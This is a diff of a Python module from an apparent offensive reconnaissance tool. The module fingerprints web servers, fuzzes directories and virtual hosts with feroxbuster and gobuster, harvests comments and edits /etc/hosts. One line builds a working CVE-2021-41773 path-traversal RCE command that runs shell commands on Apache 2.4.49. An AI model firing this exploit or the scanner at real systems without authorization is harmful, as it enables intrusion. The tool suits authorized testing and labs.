@@ -1,78 +1,92 @@
 import subprocess
-from threading import Thread
 from mods.mod_utils import *
 from mods import mod_dns
 from mods.http_wordlist import wordlist
+from urllib.parse import urlparse
 import requests
 import urllib3
 import re
 import os
 
-
 # Globals
-extensions = ['.txt', '.bak', '.cgi', '.html']
-common_words = []
 fast_wordlist = ''
-ip = ''
-port = ''
-fuzz_list = []
-fuzz_done = []
-tested_wordlist = []
 comments_founded = []
-dns = ''
-proto = 'http'
+urls_founded = []
+domain = ''
+server = ''
+extensions = ['txt']
+
+technologies = [
+    'X-Powered-By',            # Technology used to power the server (e.g., PHP, ASP.NET)
+    'Via',                     # Intermediate proxies or gateways
+    'X-AspNet-Version',        # ASP.NET version
+    'X-AspNetMvc-Version',     # ASP.NET MVC version
+    'X-Backend-Server',        # Backend server information
+    'X-Drupal-Cache',          # Drupal caching information
+    'X-Drupal-Dynamic-Cache',  # Drupal dynamic cache status
+    'X-Drupal-Cache-Tags',     # Drupal cache tags
+    'X-Generator',             # Content management system (CMS) or framework generator
+    'X-Joomla-Template',       # Joomla template used
+    'X-Pingback',              # XML-RPC pingback URL (often used by WordPress)
+    'X-Redirect-By',           # Redirection mechanism (often used by WordPress)
+    'X-Powered-CMS',           # CMS powering the site
+    'X-Shopify-Stage',         # Shopify stage environment
+    'X-Turbo-Charged-By',      # Turbo caching system
+    'X-Varnish',               # Varnish caching
+    'X-Wix-Request-Id',        # Wix request identifier
+    'X-WordPress-Cache',       # WordPress cache status
+    'X-WordPress-Debug',       # WordPress debug information
+    'X-WordPress-Theme',       # WordPress theme information
+    'CF-Cache-Status',         # Cloudflare cache status
+    'CF-Ray',                  # Cloudflare request identifier
+    'CF-Request-ID',           # Cloudflare request ID
+    'Fastly-Request-ID',       # Fastly request ID
+    'X-CDN',                   # CDN information
+    'X-Cache',                 # Cache status
+    'X-Cache-Hits',            # Number of cache hits
+    'X-Cache-Lookup',          # Cache lookup status
+    'X-Cache-Status'           # Cache status indicator
+]
+
 # Disable insecure request warnings from urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
-def http_connect_to_server(url):
-    response = None
-    try:
-        response = requests.get(url, verify=False)
-        http_extract_comments(response)
-
-        if (response.status_code == 400) and ('HTTPS' in response.text):
-            current_protocol = proto
-            http_change_protocol()
-            response = requests.get(url.replace(current_protocol, proto), verify=False)
-    except Exception as e:        
-        e = str(e)
-
-        if ('Name or service not known' in e):
-            http_identify_dns(e)
-
-    return response
+def is_valid_url(url):
+    regex = re.compile(
+        r'^(?:http|ftp)s?://' # http:// or https://
+        r'(?:' # Start non-capturing group for domain
+        r'(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' # domain...
+        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|' # ...or ipv4
+        r'\[?[A-F0-9]*:[A-F0-9:]+\]?' # ...or ipv6
+        r'|(?:[A-Z0-9-]+))' # or non-strict domain (e.g., tripladvisor)
+        r'(?::\d+)?' # optional port
+        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
+    return re.match(regex, url) is not None
 
 
-def http_change_protocol():
-    global proto
-    if (proto == 'http'):
-        proto = 'https'
-        return
-    proto = 'http'
+def is_blacklisted_url(url):
+    blacklist = ['.png', '.jpg', '.css', '.ttf']
+    for item in blacklist:
+        if item in url: return True
+    return False
 
 
-def http_identify_dns(e):
-    global dns
-    # Handle redirections to an unregistered domain or subdomain
-    if (len(dns) > 1):
-        return
-
-    _dns = re.findall("host='(.*)',", e)
-    uri = re.findall('with url: (.*) \(', e)    
-
-    # Update DNS
-    if _dns:
-        subdomains = [_dns[0]]
-        len_dns = _dns[0].split('.')
-        main_domain = _dns[0]
-        if len(len_dns) > 2:
-            main_domain = f'{len_dns[-2]}.{len_dns[-1]}'
-            subdomains.append(main_domain)
-        if len(dns) < 1:
-            dns = main_domain
-
-            register_subdomains(subdomains)
+def register_subdomains(subdomains, ip='127.0.0.1', cmd=None):
+    result = True
+    if len(subdomains) > 0:   
+        if cmd:
+            print(f'[!] {cmd}')
+        printc('[+] Some subdomains have been found:', GREEN)
+        for subdomain in subdomains:
+            printc(f'[+] {subdomain}', BLUE)
+        try: 
+            mod_dns.dns_add_subdomains(ip, subdomains)
+            printc('[+] Domain added correctly to /etc/hosts', GREEN)
+        except Exception as e:
+            result = False
+            printc(f'[-] {e}', RED)
+    return result
 
 
 def create_short_wordlist():
@@ -85,32 +99,32 @@ def create_short_wordlist():
     fast_wordlist = fast_wordlist_filename
 
 
-def launch_threads(threads):
-    # Helper function to start and join threads
-    for thread in threads:
-        try:
-            thread.start()
-        except:
-            pass
-    for thread in threads:
-        try:
-            thread.join()
-        except:
-            pass
-    return []
-
-
-def http_identify_server(response):
+def http_identify_server(host, port, proto='http'):
+    global server
     global extensions
-    if not response:
+    
+    if (server != ''): return
+    response = make_request(update_url(host, port, proto))
+    if not response: return
+
+    tech = []
+
+    try:
+        if ('Server' in response.headers):
+            server_header = response.headers['Server']
+            server = server_header
+
+        for technology in technologies:
+            if technology in response.headers:
+                tech.append(response.headers[technology])
+    except Exception as e:
+        printc(f'[-] {e}', RED)
         return
 
-    server_header = response.headers['Server']
-    if 'Apache' in server_header:
-        print_banner(port)
+    if ('Apache' in server_header):
         printc('[!] Apache server, Fuzzing for PHP files.', GREEN)
-        printc(f'[!] {server_header}', BLUE)
-        extensions.append('.php')
+        extensions.append('html')
+        extensions.append('php')
 
         if '2.4.49' in server_header:
             cmd = f"curl http://{response.request.headers['Host']}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'"
@@ -123,148 +137,158 @@ def http_identify_server(response):
                         printc('[+] Possible RCE confirmed. CVE-2021-41773', RED, YELLOW)
                         printc(cmd, BLUE)
                         print(output)
-            except:
+            except Exception as e:
+                printc(f'[-] {e}', RED)
                 return
-    elif 'Microsoft-IIS' in server_header:
-        print_banner(port)
+    elif ('Microsoft-IIS' in server_header):
         printc('[!] Microsoft IIS server, Fuzzing for ASP, ASPX files.', GREEN)
-        printc(f'[!] {server_header}', BLUE)
-        extensions.append('.asp')
-        extensions.append('.aspx')
+        extensions.append('asp')
+        extensions.append('php')
+        extensions.append('aspx')
+    elif ('Simple' in server_header) and ('Python' in server_header):
+        printc('[!] Python Development Server, Directory listing should be enabled.', GREEN)
+
+    else:
+        print('[!] Unknown Server')
+
+    if (server_header != ''): printc(f'[+] {server_header}', BLUE)
+
+    if len(tech) > 0:
+        print('[!] Possible Technologies')
+        for technology in tech:
+            printc(f'[+] {technology}', BLUE)
 
 
-def http_extract_comments(response):
+def make_request(base_url):
+    if not is_valid_url(base_url): return
+    response = None
+    try:
+        response = requests.get(base_url, verify=False, allow_redirects=False)
+    except requests.exceptions.SSLError as e:
+        try:
+            response = requests.get('http://' + base_url.split('://')[1], verify=False, allow_redirects=True)
+        except Exception as e:
+            error = str(e)
+            if ('(' in error):
+                error = error.replace(')', '').replace('(', '\n')
+            printc(f'[-] {error}', RED)
+    except Exception as e:
+        error = str(e)
+        if ('(' in error):
+            error = error.replace(')', '').replace('(', '\n')
+        printc(f'[-] {error}', RED)
+    return response
+
+
+def http_extract_comments(response):    
+    if not response: return
+
     global comments_founded
-    
     body = str(response.text)
     results_html = re.findall('(<!--.*-->)', body)
     results_version = re.findall('.*"(.{1,40}\d{1,1}\.\d{1,2}\.\d{0,2}.{1,40})".*\n', body)
     results_version_two = re.findall('.*>(.{1,40}\d{1,1}\.\d{1,2}\.\d{0,2}.{1,40})<.*\n', body)
-    comments = results_html + results_version
+    comments_founded += results_html 
+    comments_founded += results_version 
+    comments_founded += results_version_two
 
-    if comments:
-        to_show = []
-        for comment in comments:
-            if comment in comments_founded:
+
+def get_domain(url):
+    # Parse the URL and extract the hostname
+    parsed_url = urlparse(url)
+    hostname = parsed_url.hostname
+
+    # If there is no hostname, the URL might be invalid
+    if not hostname:
+        return None
+
+    # Split the hostname into parts
+    parts = hostname.split('.')
+
+    # If the hostname is just an IP address or doesn't contain enough parts, return it as is
+    if len(parts) < 2:
+        return hostname
+
+    # Return the domain and TLD
+    return '.'.join(parts[-2:])
+
+
+def call_ferox(filename, ip, port, proto='http', checkdns=True, silent=True):
+    global urls_founded
+    global server
+
+    base_url = update_url(ip, port)
+    cmd_printed = False
+    if silent:
+        cmd = f'feroxbuster -u {base_url} -w {filename} -x {",".join(list(set(extensions)))} -t 100 --no-state --extract-links -C 400,401,403,404,501,502,503 -r -k -E -g -d 1 --silent'
+    else:
+        cmd = f'feroxbuster -u {base_url} -w {filename} -x {",".join(list(set(extensions)))} -t 100 --no-state --extract-links -C 400,401,403,404,501,502,503 -r -k -E -g -d 1 -q'
+
+    try:
+        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
+
+        while True:
+            line = process.stdout.readline()
+            if not line:
+                break
+            elif is_blacklisted_url(line) or (line.strip() == ''):
                 continue
-            comments_founded.append(comment.strip())
-            to_show.append(comment)
-        if not to_show:
-            return
-        comments_data = '\n\n'.join(to_show)
-        print_banner(port)
-        print(f'[!] Comments found in: {response.request.url}')
-        printc(comments_data, GREEN)
+            # Identifies if there was an internal subdomain error 
+            # feroxbuster is called again without --silent parameter in order to
+            # identify this subdomain
+            elif ('could not connect' in line.lower()) and silent:
+                silent = False
+                call_ferox(filename, ip, port, proto, checkdns, silent)
+                cmd_printed =True
+                break
+            # When feroxbuster is called withour --silent parameter
+            # we captures this error to extract the domain where
+            # we have been redirected
+            elif ('operation timed out' in line.lower()):
+                domain_and_port = line.split('/')[2]
+                host = domain_and_port.split(':')[0]
+                if (host != ip) and checkdns:
+                    global domain
+                    if (domain == ''):
+                        domain = get_domain(host)
+                    # Register the new domain/subdomain
+                    if not register_subdomains([host], ip): 
+                        break
+                    checkdns = False
+
+                    # We make a test to see if there is HTTPS and use it as prefered Protocol
+                    response = make_request(update_url(host, port, 'https'))
+                    if response: proto = 'https'
+                    
+                    # Once the subdomain is registered we tries to identify the technologies on it
+                    server = ''
+                    http_identify_server(host, port, proto)
+                    
+                    # This time we call feroxbuster with the address of the registered domain
+                    silent = True
+                    call_ferox(filename, host, port, proto, checkdns, silent)
+                    cmd_printed = True
+                    break
+            else:
+                if not cmd_printed: print(f'[!] {cmd}\n'); cmd_printed = True
+                line = line.strip()
+                urls_founded.append(line)
+
+                print(line)
+        process.kill()
+
+    except Exception as e:
+        if not cmd_printed: print(f'[!] {cmd}\n')
+        printc(f'[-] {e}', RED)
+        return None
+
+    return urls_founded
 
 
-def call_gobuster(filename, url, ban_code=None):
-    global fuzz_done
-    if (url in fuzz_done):
-        return None # Return None if URL has already been tested*
-
-    cms_content = ['wp', 'wordpress', 'wp-content', 'wp-includes']
-    for cms in cms_content:
-        if cms in url:
-            if '.php' in extensions:
-                extensions.remove('.php')
-            break
-
-    cmd = f'gobuster dir -u {url} -w {filename} -x {",".join(extensions)} -t 70 -z --no-error -k'   
-    if ban_code:
-        cmd += f' {ban_code}'
-    fuzz_done.append(url)
-    response = http_connect_to_server(url) 
-    output = None
-
-    if response:
-        try:
-            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
-
-            if 'To continue please exclude the status code or the length' in output:
-                code_found = re.findall('=> (...) \(Length:', output)
-                if code_found:
-                    code = code_found[0]
-                    call_gobuster(filename, url, code)
-                
-            output = output.replace('\n\n', '\n').split('===============================================================')[4]
-            if not ((len(output) > 4) and (output.strip() != "")):
-                return None
-        except:
-            return None
-    
-    return output
-
-
-def http_fuzz_files(url):
-    global fuzz_done
-    filename = fast_wordlist 
-
-    output = call_gobuster(filename, url)
-
-    if output:
-        print_banner(port)
-        print(f'[!] gobuster dir -u {url} -w {filename} -x {",".join(extensions)} -t 70 -z --no-error -k')
-        printc(f'[!] URL: {url}', GREEN)
-        print(output)
-        
-        # Handle Redirections
-        redirections = re.findall('--> (.+)\]', output)
-        if redirections:
-            for new_url in redirections:   
-                if '://' in new_url: 
-                    if (not ip in new_url) and (len(dns) < 1):
-                        if '/' in new_url:
-                            register_subdomains([new_url.split('/')[2]])    
-                elif (new_url[0] == '/'):
-                    host = url.split('/')[2]
-                    new_url = f'{proto}://{host}{new_url}'
-                else:
-                    host = url.split('//')[1]
-                    new_url = f'{proto}://{host}/{new_url}'
-                fuzz_list.append(new_url)
-
-        # Extract comments
-        uris = []
-        if url[-1] == '/':
-            url = url[:-1]
-        for line in output.splitlines():
-            if 'Status: 2' in line:
-                uri = '/' + line.split('(')[0].strip().split('/')[1]
-                new_url = url + uri
-                if new_url in fuzz_done:
-                    return
-                fuzz_done.append(url)
-                http_connect_to_server(new_url)
-            if 'Status: 403' in line: 
-                uri = '/' + line.split('(')[0].strip().split('/')[1] + '/'
-                new_url = url + uri
-                if new_url in fuzz_done:
-                    return
-                fuzz_list.append(new_url)
-
-
-def register_subdomains(subdomains, cmd=None):
-    global fuzz_list
-    if len(subdomains) > 0:    
-        mod_dns.dns_add_subdomains(ip, subdomains)
-
-        for subdomain in subdomains:
-            new_url = f'http://{subdomain}'
-            fuzz_list.append(new_url)
-        
-        print_banner(port)
-        if cmd:
-            print(f'[!] {cmd}')
-        printc('[+] Some subdomains have been found:', GREEN)
-        for subdomain in subdomains:
-            printc(f'[+] {subdomain}', BLUE)
-    return new_url
-
-
-def http_fuzz_subdomains():
+def http_fuzz_subdomains(port):
     filename = fast_wordlist
 
-    cmd = f'gobuster vhost -u {dns} -w {filename} -t 70 -z --no-error --append-domain -k'
+    cmd = f'gobuster vhost -u {domain} -w {filename} -t 70 -z --no-error --append-domain -k'
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
     except:
@@ -273,56 +297,44 @@ def http_fuzz_subdomains():
         results = output.splitlines()
         subdomains = []
         for line in results:
-            if dns in line:
+            if (domain in line):
                 subdomain = line.split(' ')[1]
                 subdomains.append(subdomain)   
         register_subdomains(subdomains, cmd)
+        
+        if len(subdomain) > 0:
+            for host in subdomains:
+                for url in urls_founded:
+                    if host not in url: call_ferox(filename, host, port)
 
 
-def handle_http(_ip, _port):
-    global ip
-    global port
-    global fuzz_list
-    global dns
+def update_url(host, port, proto='http'):
+    return f'{proto}://{host}:{port}'
 
-    ip = _ip
-    port = _port
-    
-    current_proto = proto
-    base_url = f'{proto}://{ip}:{port}'
-    fuzz_list.append(base_url)
+
+def handle_http(ip, port):
+    error_display_port = port 
+
     create_short_wordlist()
 
-    # Test first connection to the server
-    response = http_connect_to_server(base_url)
-    if current_proto != proto:
-        base_url = base_url.replace(current_proto, proto)
-        fuzz_list.append(base_url)
-    http_identify_server(response)
-    dns_tested = False
-
-    while len(fuzz_list) > 0:
-        threads = []
-
-        for url in fuzz_list:
-            if not dns_tested and (not ip in url) and (len(dns) < 1):
-                _dns = url.split('/')[2]
-                dns = _dns
-                len_dns = _dns.split('.')
-                if len(len_dns) > 2:
-                    dns = f'{len_dns[-2]}.{len_dns[-1]}'
-
-            # Start threads to execute
-            thread = Thread(target=http_fuzz_files, args=(url, ))
-            threads.append(thread)
-        
-        if not dns_tested and (len(dns) > 1):
-            dns_tested = True
-            thread = Thread(target=http_fuzz_subdomains, args=())
-            threads.append(thread)
-
-        threads = launch_threads(threads)
-        
-        for url in fuzz_done:
-            if url in fuzz_list:
-                fuzz_list.remove(url)           
+    # PINT BANNER
+    print_banner(error_display_port)
+    # IDENTIFY SERVER TECHNOLOGIES
+    http_identify_server(ip, port)
+    # PRINT INITIAL URL
+    printc(f'[!] URL: {update_url(ip, port)}', GREEN)
+    # LAUNCH FEROXBUSTER
+    urls = call_ferox(fast_wordlist, ip, port)
+    print('')
+    # EXTRACT COMMENTS
+    if len(urls) > 0:
+        for url in urls:
+            http_extract_comments(make_request(url))
+    # PRINT COMMENTS
+    if len(comments_founded) > 0:
+        print(f'[!] Comments found:')
+        printc('\n'.join(list(set(comments_founded))), GREEN)
+    # FUZZ SUBDOMAINS
+    if (domain != ''):
+        http_fuzz_subdomains(port)
+    
